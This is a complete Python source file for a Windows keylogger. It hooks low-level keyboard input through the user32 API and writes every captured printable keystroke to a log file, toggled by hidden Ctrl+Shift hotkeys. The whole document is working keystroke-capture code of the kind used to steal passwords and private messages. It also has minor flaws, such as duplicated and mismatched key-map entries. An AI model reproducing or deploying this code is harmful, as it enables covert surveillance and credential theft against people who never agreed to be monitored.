import os
import sys
import ctypes
import string
import threading
from ctypes import wintypes

WH_KEYBOARD_LL = 13 # Installs a hook procedure that monitors low-level keyboard input events. https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
WM_KEYDOWN = 0x0100

user32 = ctypes.WinDLL('user32', use_last_error=True)

class Keylogger:
    def __init__(self, log_file, save_interval=60):
        self.log_file = log_file
        self.hook_handle = None
        self.log = None
        self.save_interval = save_interval
        self.recording = False

    def start(self):
        HOOKPROC = ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, ctypes.POINTER(ctypes.c_ulong))
        hook = HOOKPROC(self.low_level_keyboard_proc)
        self.hook_handle = user32.SetWindowsHookExA(WH_KEYBOARD_LL, hook, None, 0)

        msg = ctypes.wintypes.MSG()
        while user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageA(ctypes.byref(msg))

    def start_recording(self):
        self.recording = True
        self.log = open(self.log_file, 'ab')
        self.save_timer()

        with open("keylogger.pid", "w") as pid_file:
            pid_file.write(str(os.getpid()))

    def stop_recording(self):
        self.recording = False
        user32.UnhookWindowsHookEx(self.hook_handle)

        # Remove pid file
        if os.path.exists("keylogger.pid"):
            os.remove("keylogger.pid")

        if self.log:
            self.log.flush()
            self.log.close()

    def save_timer(self):
        if self.recording:
            self.log.flush()
            threading.Timer(self.save_interval, self.save_timer).start()

    # https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)
    def low_level_keyboard_proc(self, nCode, wParam, lParam):
        if nCode == 0 and wParam == WM_KEYDOWN:
            # https://learn.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct
            vk_code = lParam[0]
            ctrl_pressed = (user32.GetKeyState(0x11) & 0x8000) != 0
            shift_pressed = (user32.GetKeyState(0xA0) & 0x8000) != 0 or (user32.GetKeyState(0xA1) & 0x8000) != 0
            caps_lock_on = (user32.GetKeyState(0x14) & 0x0001) != 0

            regular_key_map = {
                0x60: '0', 0x61: '1', 0x62: '2', 0x63: '3', 0x64: '4', 0x65: '5', 0x66: '6', 0x67: '7', 0x68: '8', 
                0x69: '9', 0x6A: '*', 0x6B: '+', 0x6C: ',', 0x6D: '-', 0x6E: '.', 0x6F: '/', 0xBA: ';', 0xBB: '=',
                0xBA: ';', 0xBB: '=', 0xBC: ',', 0xBD: '-', 0xBE: '.', 0xBF: '/', 0xC0: '`', 0xDB: '[', 0xDC: '\\', 
                0xDD: ']', 0xDE: "'", 0xBE: '.'
            }

            shift_key_map = {
                '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^', '7': '&', '8': '*', '9': '(', '0': ')', 
                0xBA: ':', 0xBB: '+', 0xBC: '<', 0xBD: '_', 0xBE: '>', 0xBF: '?', 0xC0: '~', 0xDB: '{', 0xDC: '|',
                0xDD: '}', 0xDE: '"', 0xBE: '.'
            }

            # Start recording: CTRL + SHIFT + A
            if ctrl_pressed and shift_pressed and vk_code == ord('A') and not self.recording:
                self.start_recording()
                return user32.CallNextHookEx(None, nCode, wParam, lParam)

            # Stop recording and exit: CTRL + SHIFT + Z
            if ctrl_pressed and shift_pressed and vk_code == ord('Z'):
                self.stop_recording()
                os._exit(0)

            if self.recording:
                key = None
                # Get the correct key
                if vk_code in regular_key_map and not shift_pressed:
                    key = regular_key_map[vk_code]
                elif vk_code in shift_key_map and shift_pressed:
                    key = shift_key_map[vk_code]
                else:
                    key = chr(vk_code)

                if caps_lock_on ^ shift_pressed:
                    key = key.upper()
                else:
                    key = key.lower()

                if key in string.printable:
                    encoded_key = key.encode()
                    self.log.write(encoded_key)
                elif vk_code == 0x08:  # Backspace key
                    self.log.seek(-1, os.SEEK_END)
                    self.log.truncate()

        return user32.CallNextHookEx(None, nCode, wParam, lParam)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python keylogger.py <log_file> <save_interval>")
        sys.exit(1)

    log_file = sys.argv[1]
    save_interval = int(sys.argv[2])

    keylogger = Keylogger(log_file, save_interval)
    keylogger.start()